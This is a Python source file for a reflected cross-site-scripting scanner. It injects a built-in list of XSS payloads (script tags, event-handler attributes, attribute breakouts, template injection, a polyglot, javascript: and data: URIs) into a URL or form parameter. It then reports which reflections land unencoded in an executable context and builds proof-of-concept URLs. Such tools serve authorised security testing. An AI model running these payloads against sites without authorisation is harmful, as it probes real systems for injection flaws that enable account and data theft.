#!/usr/bin/env python
"""xss_scan.py — reflection-grade XSS scanner (Dalfox-style).

Per payload, reports: (1) RAW reflection — the payload survived UNENCODED
(necessary); (2) the landing context; and crucially (3) whether that context is
EXECUTABLE. A reflection inside a non-executing sink (<textarea>/<title>/<style>/
<xmp>/<noscript>/HTML comment) or an HTML-ENCODED reflection is NOT executable
and is reported as informational, never a lead — the reflected!=XSS rule
(pitfalls.md) made mechanical, replacing the old unconditional executable=True.

Emits a LEAD ("verify execution in a real browser"), never "confirmed": urllib
sees bytes, not DOM execution — browser_probe.py confirms. CWE-79.

Usage: python xss_scan.py <url> --param name [--method GET|POST] [--data 'k=__INJECT__']
"""
import argparse, concurrent.futures, html, json, os, re, sys, urllib.parse
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from _http import get, post

PAYLOADS = [
    ("classic_alert", "<script>alert(1)</script>"),
    ("img_onerror", "<img src=x onerror=alert(1)>"),
    ("svg_onload", "<svg onload=alert(1)>"),
    ("body_onload", "<body onload=alert(1)>"),
    ("input_focus", "<input autofocus onfocus=alert(1)>"),
    ("attr_break", '"><script>alert(1)</script>'),
    ("attr_event", '" onmouseover=alert(1) x="'),
    ("js_break", "';alert(1);//"),
    ("template", "{{constructor.constructor('alert(1)')()}}"),
    ("polyglot", "jaVasCript:/*-/*`/*`/*'/*\"/*/**/(/* */oNcliCk=alert() )//%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!><sVg/<sVg/oNloAd=alert()//>"),
    ("href_js", "javascript:alert(1)"),
    ("data_uri", "data:text/html,<script>alert(1)</script>"),
    ("svg_use", "<svg><use href=\"data:image/svg+xml,<svg onload='alert(1)'>\"/></svg>"),
    ("detail_open", "<details open ontoggle=alert(1)>"),
]

RAWTEXT_SINKS = ("textarea", "title", "style", "xmp", "noscript")


def nonexec_sink(body_lower, idx):
    """If the reflection at idx sits inside a non-executing sink, name it (else None)."""
    pre = body_lower[:idx]
    if pre.rfind("<!--") > pre.rfind("-->"):
        return "html-comment"
    for tag in RAWTEXT_SINKS:
        if pre.rfind("<" + tag) > pre.rfind("</" + tag):
            return tag
    return None


def is_executable(payload, context):
    """Executable only if the raw payload carries a markup-breaking char for THIS
    context. A bare string (e.g. `javascript:alert(1)`) reflected as HTML TEXT is
    not executable — it needs a URL-attribute sink we cannot prove black-box."""
    if context in RAWTEXT_SINKS or context == "html-comment":
        return False
    if context == "script":
        return True                                  # already inside a JS context
    if context == "attr":
        # a quote is needed to break OUT of a quoted attribute value; a bare `<` stays literal inside it
        return ('"' in payload) or ("'" in payload)
    return "<" in payload                            # html text: need to open a tag


def classify(body, payload):
    """Determine reflection/context/executability for one payload."""
    raw = payload in body                                   # survived unencoded
    if not raw:
        encoded = html.escape(payload) in body
        return {"reflected": False, "encoded_reflected": encoded,
                "context": None, "nonexec_sink": None, "executable": False}
    bl = body.lower(); idx = body.find(payload)
    sink = nonexec_sink(bl, idx)
    win = bl[max(0, idx - 200):idx]
    before = body[max(0, idx - 30):idx]
    if sink:
        context = sink
    elif win.rfind("<script") > win.rfind("</script"):
        context = "script"
    elif re.search(r'=\s*["\']?$', before):
        context = "attr"
    else:
        context = "html"
    return {"reflected": True, "encoded_reflected": False, "context": context,
            "nonexec_sink": sink, "executable": is_executable(payload, context)}


def test(url, param, label, payload, method, data_tmpl):
    if method == "POST":
        body = data_tmpl.replace("__INJECT__", urllib.parse.quote(payload))
        r = post(url, data=body.encode(),
                 headers={"Content-Type": "application/x-www-form-urlencoded"}, timeout=15)
    else:
        sep = "&" if "?" in url else "?"
        r = get(f"{url}{sep}{param}={urllib.parse.quote(payload)}", timeout=15)
    if r.error:
        return {"label": label, "payload": payload[:60], "error": r.error}
    c = classify(r.text, payload)
    poc = (f"{url}{'&' if '?' in url else '?'}{param}={urllib.parse.quote(payload)}"
           if (c["executable"] and method == "GET") else None)
    return {"label": label, "payload": payload[:60], **c, "status": r.status, "poc_url": poc}


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("url")
    ap.add_argument("--param", required=True)
    ap.add_argument("--method", choices=["GET", "POST"], default="GET")
    ap.add_argument("--data", default="")
    ap.add_argument("--concurrency", type=int, default=6)
    args = ap.parse_args()
    data_tmpl = args.data or f"{args.param}=__INJECT__"

    results = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=args.concurrency) as pool:
        futs = [pool.submit(test, args.url, args.param, lbl, pl, args.method, data_tmpl)
                for lbl, pl in PAYLOADS]
        for f in concurrent.futures.as_completed(futs):
            results.append(f.result())
    exec_leads = [r for r in results if r.get("executable")]
    reflected = [r for r in results if r.get("reflected")]
    if exec_leads:
        verdict = ("XSS LEAD — unencoded reflection in an executable context "
                   "(verify execution in a real browser: browser_probe.py)")
        disposition = "lead"
    elif reflected:
        verdict = "reflected but in a non-executing sink / encoded (informational)"
        disposition = "informational"
    else:
        verdict = "no reflection"
        disposition = "none"
    print(json.dumps({
        "tool": "xss_scan", "target": args.url, "param": args.param, "ok": True, "payloads_tested": len(PAYLOADS),
        "signals": len(exec_leads), "results": results,
        "reflected": len(reflected), "executable_candidates": len(exec_leads),
        "disposition": disposition, "verdict": verdict,
        "lead_details": exec_leads, "all_reflected": reflected,
        "note": "reflected+executable = potential XSS LEAD — confirm DOM execution in a real browser "
                "(browser_probe.py). Non-executing sink / encoded-only = refuted/informational."},
        indent=2))


if __name__ == "__main__":
    main()
